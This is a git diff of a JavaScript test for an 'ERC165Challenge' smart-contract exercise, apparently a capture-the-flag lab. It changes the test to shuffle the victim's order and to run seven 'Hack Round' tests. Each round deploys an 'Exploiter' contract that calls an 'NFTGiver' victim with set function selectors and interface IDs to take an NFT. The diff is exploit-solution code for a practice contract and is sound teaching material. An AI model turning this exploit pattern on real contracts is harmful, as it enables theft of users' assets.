@@ -32,8 +32,8 @@ describe('ERC165Challenge', function () {
         const AwardFactory = await ethers.getContractFactory('Award');
         const award = await AwardFactory.deploy();
 
-        const order = [4, 2, 3, 1];
-        // shuffleArray(order);
+        const order = [1, 2, 3, 4];
+        shuffleArray(order);
 
         const Factory = await ethers.getContractFactory('NFTGiver');
         const victim = await Factory.deploy(award.address, order);
@@ -45,25 +45,23 @@ describe('ERC165Challenge', function () {
         award.transferFrom(owner.address, victim.address, 1337);
     });
 
-    // [1, 2, 3, 4, 5, 6, 7].forEach(function (round) {
-    [1].forEach(function (round) {
-        it(`Hack Round ${round}`, async function () {
-        funcSig = ["0x5c0509f5","0x0b8287ee","0x48881449","0x444ce9de"];
-        ifceId = ["0x4e2312e0","0x88a7ca5c","0x13371337","0xdecafc0f"];
-
-            console.log("ORDER : ",this.order)
-            /* YOUR CODE HERE */
-            const ExploiterFactory = await ethers.getContractFactory('Exploiter');
-            const exploiter = await ExploiterFactory.connect(attacker).deploy();
-
-            this.order.reverse().forEach(async (i)=>{
-                console.log(">>>>>>>>>",i)
-                await exploiter.connect(attacker).execute(this.victim.address,funcSig[i-1],ifceId[i-1],this.award.address)
-            })
-
-            await exploiter.connect(attacker).callSuccess(this.victim.address,this.award.address)
+    [1, 2, 3, 4, 5, 6, 7].forEach(function (round) {
+        // [1].forEach(function (round) {
+            it(`Hack Round ${round}`, async function () {
+                /* YOUR CODE HERE */
+                funcSig = ["0x5c0509f5","0x0b8287ee","0x48881449","0x444ce9de"];
+                ifceId = ["0x4e2312e0","0x88a7ca5c","0x13371337","0xdecafc0f"];
+    
+                const ExploiterFactory = await ethers.getContractFactory('Exploiter');
+                const exploiter = await ExploiterFactory.connect(attacker).deploy();
+    
+                this.order.reverse().forEach(async (i)=>{
+                    await exploiter.connect(attacker).execute(this.victim.address,funcSig[i-1],ifceId[i-1],this.award.address)
+                })
+    
+                await exploiter.connect(attacker).callSuccess(this.victim.address,this.award.address)
+            });
         });
-    });
 
     this.afterEach(async function () {
         expect(await this.award.ownerOf(1337)).to.be.equal(
